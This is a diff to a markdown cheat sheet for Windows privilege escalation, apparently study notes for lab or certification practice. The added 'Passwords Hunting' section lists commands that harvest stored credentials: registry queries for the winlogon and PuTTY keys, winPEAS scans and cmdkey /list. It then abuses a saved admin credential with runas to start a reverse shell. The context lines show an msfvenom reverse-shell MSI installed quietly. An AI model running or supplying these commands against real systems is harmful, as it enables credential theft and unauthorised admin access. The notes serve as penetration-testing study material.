@@ -79,6 +79,28 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o 
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
+## Passwords Hunting
+
+### Registries
+```
+// Use winPEAS to check common password locations:
+.\winPEASany.exe quiet filesinfo userinfo
+
+//manual check
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+
+### Saved Creds
+ 
+.\winPEASany.exe quiet cmd windowscreds
+// We can verify this manually using the following command:
+cmdkey /list
+
+EXPLOITATION
+//We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+```
 ## Exploits
 
 ### Juicy potato
